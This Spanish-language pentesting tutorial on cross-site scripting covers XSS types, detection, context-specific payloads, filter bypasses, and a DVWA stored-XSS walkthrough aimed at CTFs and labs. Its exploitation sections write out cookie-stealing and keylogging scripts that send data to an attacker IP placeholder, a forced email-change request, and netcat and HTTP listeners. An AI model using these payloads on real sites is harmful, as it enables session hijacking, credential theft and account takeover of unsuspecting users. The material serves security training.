# XSS — Cross-Site Scripting

**XSS** ocurre cuando una aplicación refleja datos controlados por el usuario en una página **sin sanearlos**, permitiendo inyectar **JavaScript** que se ejecuta en el navegador de la víctima. A diferencia de SQLi (que ataca al servidor), XSS ataca a **otros usuarios**: robo de sesiones, suplantación, keylogging o acciones en su nombre.

---

## Tipos de XSS

| Tipo | Dónde vive el payload | Impacto |
| ---- | --------------------- | ------- |
| **Reflejado** | En la URL/parámetro; se refleja en la respuesta inmediata. | Requiere engañar a la víctima para que abra un enlace. |
| **Almacenado (persistente)** | Guardado en el servidor (comentario, perfil, mensaje). | El peor: afecta a todo el que vea la página. |
| **DOM-based** | El JS del cliente lo procesa sin pasar por el servidor. | Difícil de detectar desde el servidor. |

---

## Detección

Inyecta una cadena única y busca si se refleja **sin escapar**:

```text
'"><h1>xss</h1>
```

Si aparece un encabezado real (no el texto literal), el HTML se está interpretando. Prueba entonces a ejecutar JS:

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

> Usa `alert(document.domain)` en lugar de `alert(1)`: confirma **en qué dominio** se ejecuta, útil cuando hay iframes o subdominios.

---

## Según el contexto de inyección

El payload cambia según **dónde** caiga tu input en el HTML:

```html
<!-- Dentro de texto HTML -->
<script>alert(1)</script>

<!-- Dentro de un atributo (cierra la comilla primero) -->
"><img src=x onerror=alert(1)>

<!-- Dentro de un <script> existente -->
';alert(1)//

<!-- Dentro de un href/src -->
javascript:alert(1)

<!-- Eventos cuando se filtran etiquetas -->
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
```

---

## Bypass de filtros

| Filtro | Bypass |
| ------ | ------ |
| Bloquea `<script>` | Usa `<img onerror>`, `<svg onload>`, `<body onload>`. |
| Bloquea `alert` | `prompt()`, `confirm()`, `print()`, `(alert)(1)`. |
| Bloquea paréntesis | `onerror=alert\`1\`` (template literals). |
| Filtra mayús/minús | Mezcla: `<ScRiPt>`. |
| Codificación | HTML entities, `a`, URL-encoding doble. |
| Palabras clave | Comentarios/concatenación: `ale/**/rt`. |

PortSwigger tiene una **"XSS cheat sheet"** interactiva excelente para encontrar el vector según el contexto.

---

## Explotación (más allá del alert)

El `alert` solo prueba el fallo. El impacto real:

### Robo de cookies de sesión

```html
<script>
fetch('http://<TU_IP>/c?='+document.cookie)
</script>
```

```bash
# En tu máquina, a la escucha:
nc -lvnp 80
```

> Si la cookie tiene el flag `HttpOnly`, no podrás leerla desde JS. Entonces pivota a otras acciones (CSRF, keylogger, robo de tokens del DOM).

### Ejecutar acciones como la víctima

```html
<script>
fetch('/api/account/email',{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({email:'atacante@evil.com'})})
</script>
```

### Keylogger

```html
<script>document.onkeypress=e=>fetch('http://<TU_IP>/k?='+e.key)</script>
```

> Para payloads complejos, usa un framework como **BeEF** que "engancha" el navegador de la víctima.

---

## XSS en el flujo de un pentest

- **Robo de sesión de admin** → acceso al panel → a menudo, de ahí a RCE (subida de ficheros, plugins).
- En CTFs con "bot" que visita URLs, el XSS reflejado contra ese bot (que está autenticado como admin) es una vía clásica para robar su cookie.

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `Burp Suite` | Detección y prueba manual del contexto. |
| `dalfox` | Escáner de XSS automático y rápido. |
| `XSStrike` | Fuzzing inteligente de XSS. |
| `BeEF` | Explotación avanzada (hook del navegador). |
| PortSwigger XSS cheat sheet | Vectores por contexto. |

---

> **Consejo:** no te quedes en el `alert(1)`. Para demostrar impacto real (y resolver la máquina), roba una sesión o ejecuta una acción privilegiada. Y recuerda identificar bien el **contexto**: el 90 % del trabajo en XSS es saber cerrar correctamente la etiqueta/atributo/string donde cae tu input.

---

## Dónde practicar el XSS

| Recurso | Tipo | Enlace |
| ------- | ---- | ------ |
| PortSwigger Academy — Cross-site scripting | Labs gratis (navegador) | https://portswigger.net/web-security/cross-site-scripting |
| DVWA — XSS (Reflected/Stored/DOM) | Descargable (Docker) | https://github.com/digininja/DVWA |
| OWASP Juice Shop | Descargable (Docker) | https://github.com/juice-shop/juice-shop |
| XSS Game (Google) | Reto online | https://xss-game.appspot.com |
| TryHackMe — "XSS" / "Cross-Site Scripting" | Salas guiadas | https://tryhackme.com |
| DockerLabs (en español) | Contenedores locales | https://dockerlabs.es |

> **Consejo:** la **XSS cheat sheet** de PortSwigger (buscador de vectores por contexto) es la mejor referencia del mundo para encontrar el payload que se cuela en cada situación.

## Writeup guiado: XSS almacenado en DVWA (nivel Low)

Objetivo: dejar un payload persistente que robe la cookie de cualquiera que visite la página.

```flow
Preparar :: DVWA en Docker, seguridad "low", sección XSS (Stored).
Detectar :: Probar que el campo refleja HTML sin escapar.
Inyectar :: Guardar un <script> que exfiltra document.cookie.
Capturar :: Un listener recibe la cookie de la víctima.
```

### Paso 1 — Preparar

En DVWA (`http://localhost`, `admin:password`, seguridad **Low**) ve a **XSS (Stored)**. Hay un formulario de "libro de visitas" con *Name* y *Message*.

### Paso 2 — Comprobar que no escapa el HTML

En *Message* escribe:

```html
<b>test</b>
```

Si el texto aparece en **negrita**, el HTML se interpreta → es inyectable. (El campo *Name* suele tener un `maxlength`; quítalo con las DevTools o usa *Message*.)

### Paso 3 — Inyectar el robo de cookie

```html
<script>fetch('http://TU_IP:8000/c?='+document.cookie)</script>
```

### Paso 4 — Capturar la cookie

```bash
# En tu máquina, a la escucha:
python3 -m http.server 8000
```

Cada vez que alguien (o tú en otra sesión) abra la página, recibirás su `PHPSESSID`. Con esa cookie suplantas su sesión.

> **Nota:** en DVWA la cookie es accesible desde JS (sin `HttpOnly`). En aplicaciones reales con `HttpOnly`, pivota a otras acciones: CSRF, keylogger, o robar tokens del DOM. Practica esos casos en los labs de PortSwigger.

> **Consejo:** sube la dificultad en DVWA (Medium filtra `<script>` → usa `<img src=x onerror=...>`; High filtra más → combina mayúsculas y eventos). Ese ejercicio de "saltarse el filtro" es exactamente lo que te encontrarás en máquinas y en bug bounty.
